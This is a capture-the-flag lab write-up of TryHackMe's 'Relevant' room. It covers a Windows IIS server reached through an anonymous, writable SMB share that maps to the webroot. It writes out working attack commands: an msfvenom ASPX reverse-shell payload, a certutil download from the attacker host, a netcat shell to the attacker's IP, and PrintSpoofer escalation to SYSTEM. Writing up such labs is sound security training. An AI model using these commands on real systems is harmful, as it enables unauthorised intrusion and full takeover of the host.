---
title: THM — Relevant
type: lab-writeup
platform: THM
difficulty: intermediate
os: Windows
status: Complete
date: 2026-03-28
tags:
  - intermediate
  - lab
  - THM
  - windows
  - SMB
  - aspx
  - webshell
  - token-impersonation
  - SeImpersonatePrivilege
  - PrintSpoofer
---

# THM — Relevant

## Lab Info

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Relevant |
| Difficulty | Medium |
| OS | Windows Server 2016 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-28 |

> **Summary:** SMB share with anonymous read/write access contains encoded credentials and maps to the IIS webroot. Upload an ASPX reverse shell via SMB, trigger via HTTP. Privilege escalation through SeImpersonatePrivilege token impersonation using PrintSpoofer.

---

## Objectives

- [x] Recon: enumerate SMB shares and web services
- [x] Exploit: upload ASPX shell via writable SMB share mapped to webroot
- [x] Priv esc: SeImpersonatePrivilege → PrintSpoofer to SYSTEM

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -p- -oN nmap/relevant_full <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80/tcp | http | Microsoft IIS 10.0 |
| 135/tcp | msrpc | |
| 139/tcp | netbios-ssn | |
| 445/tcp | microsoft-ds | SMB |
| 3389/tcp | ms-wbt-server | RDP |
| 49663/tcp | http | Microsoft IIS 10.0 (non-standard port) |
| 49667/tcp | msrpc | |
| 49669/tcp | msrpc | |

> **Critical:** IIS runs on **both port 80 and port 49663**. The non-standard port is the one mapped to the SMB share.

### SMB Enumeration

```bash
# List shares
smbclient -L //<MACHINE_IP>/ -N
# ADMIN$, C$, IPC$, nt4wrksv

# Access nt4wrksv share (anonymous)
smbclient //<MACHINE_IP>/nt4wrksv -N
ls
# passwords.txt

# Download file
get passwords.txt
```

### Credentials Found

`passwords.txt` contains base64-encoded credentials:

```bash
cat passwords.txt
# Qm9iIC0gIVBAJCRXMHJEITEyMw==
# QmlsbCAtIEp1dzRublRoM0N1ITE=

echo "Qm9iIC0gIVBAJCRXMHJEITEyMw==" | base64 -d
# Bob - !P@$$W0rD!123

echo "QmlsbCAtIEp1dzRublRoM0N1ITE=" | base64 -d
# Bill - Juw4nNtH3Cu!1
```

> **Note:** These credentials don't directly work for SMB admin access or RDP in the intended path. The intended route is webshell upload.

### Key Discovery: SMB Share = IIS Webroot

```bash
# Test if nt4wrksv maps to a web directory
# Upload a test file via SMB
smbclient //<MACHINE_IP>/nt4wrksv -N
put test.txt

# Check both web ports
curl http://<MACHINE_IP>/nt4wrksv/test.txt          # Port 80 — likely 404
curl http://<MACHINE_IP>:49663/nt4wrksv/test.txt     # Port 49663 — SUCCESS
```

The `nt4wrksv` share is accessible as a subdirectory of the IIS site on port 49663.

---

## Vulnerability Background

**Misconfiguration: SMB Write Access + Webroot Mapping**

Similar to [[HTB-Devel]], the combination of anonymous write access to a share that maps to the IIS webroot allows unauthenticated code execution. Upload an ASPX web shell → trigger via HTTP.

| Field | Detail |
|---|---|
| Weakness | CWE-276: Incorrect Default Permissions + CWE-434: Unrestricted Upload |
| Impact | Remote code execution via webshell |
| Fix | Disable anonymous SMB write, don't map shares to webroot |

---

## Foothold

### Generate and Upload ASPX Shell

```bash
# Generate reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f aspx -o shell.aspx

# Upload via SMB
smbclient //<MACHINE_IP>/nt4wrksv -N
put shell.aspx

# Start listener
nc -lvnp 4444

# Trigger
curl http://<MACHINE_IP>:49663/nt4wrksv/shell.aspx
```

Shell connects as `iis apppool\defaultapppool`.

---

## Privilege Escalation

### System Enumeration

```cmd
whoami
# iis apppool\defaultapppool

whoami /priv
# SeAssignPrimaryTokenPrivilege — Disabled
# SeAuditPrivilege — Disabled
# SeChangeNotifyPrivilege — Enabled
# SeImpersonatePrivilege — Enabled     ← KEY
# SeIncreaseWorkingSetPrivilege — Disabled

systeminfo
# Windows Server 2016 Standard — 10.0 Build 14393
```

### PrintSpoofer (SeImpersonatePrivilege)

For Windows Server 2016+, **PrintSpoofer** is more reliable than JuicyPotato.

```bash
# Upload PrintSpoofer
# On attacker: host PrintSpoofer64.exe
python3 -m http.server 8080

# On target:
certutil -urlcache -f http://<YOUR_IP>:8080/PrintSpoofer64.exe C:\Users\Public\ps.exe

# Or upload via SMB
smbclient //<MACHINE_IP>/nt4wrksv -N
put PrintSpoofer64.exe

# Then copy from the share path
copy C:\inetpub\wwwroot\nt4wrksv\PrintSpoofer64.exe C:\Users\Public\ps.exe
```

```cmd
# Start listener on attacker
nc -lvnp 5555

# Execute on target
C:\Users\Public\ps.exe -i -c "C:\inetpub\wwwroot\nt4wrksv\nc.exe <YOUR_IP> 5555 -e cmd.exe"

# Or for immediate shell:
C:\Users\Public\ps.exe -i -c cmd
```

Shell connects as `NT AUTHORITY\SYSTEM`.

---

## Post-Exploitation

### Flags

| Flag | Location |
|---|---|
| User | `C:\Users\Bob\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Key Takeaways

- **Always scan all ports** — the IIS instance on 49663 was the attack surface, not port 80
- SMB shares mapped to web directories are the same vulnerability class as FTP-to-webroot ([[HTB-Devel]])
- Base64-encoded credentials in accessible shares — decode everything you find
- **PrintSpoofer** is the go-to SeImpersonatePrivilege exploit for Windows 10 / Server 2016+ (JuicyPotato doesn't work on these)
- IIS application pool accounts typically have SeImpersonatePrivilege — this is a consistent escalation path

### SeImpersonatePrivilege Exploit Selection

| OS Version | Recommended Exploit |
|---|---|
| Windows 7 / Server 2008 R2 | JuicyPotato |
| Windows 8 / Server 2012 | JuicyPotato |
| Windows 10 / Server 2016+ | PrintSpoofer or GodPotato |
| Windows 11 / Server 2022 | GodPotato |

---

## Tools Used

- Nmap
- Netcat
- smbclient
- msfvenom
- PrintSpoofer

---

## References

- [TryHackMe — Relevant](https://tryhackme.com/room/relevant)
- [PrintSpoofer — GitHub](https://github.com/itm4n/PrintSpoofer)
- [Token Impersonation — HackTricks](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens)

---
*Write-up completed: 2026-03-28*

## See Also

- Penetration-Testing-Methodology
- Windows-Privilege-Escalation
- HTB-Devel — Same attack pattern (file upload to webroot)
- HTB-Bastard — Same priv esc class (SeImpersonatePrivilege)
- Nmap
- Reverse-Shell-Cheatsheet
---
<- [[Labs-MOC]]